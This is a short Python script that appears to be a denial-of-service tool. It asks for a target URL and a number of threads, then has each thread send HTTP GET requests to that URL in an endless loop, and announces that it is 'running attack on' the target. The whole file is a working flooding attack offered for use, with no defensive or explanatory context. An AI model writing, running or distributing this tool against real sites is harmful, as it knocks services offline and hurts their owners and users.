#!/bin/python3

import requests

from threading import Thread

print('http://www.example.com  /  https://www.example.com ')
url = str(input('[+] URL: '))
potok = int(input('[+] Potok 1-10 : '))

def dos():
     while(1<10):
       requests.get(url + '9999999')



for  i in  range(int(potok)):
     ths = Thread(target=dos)
     ths.start()
print('[*] running attack on ' + url)
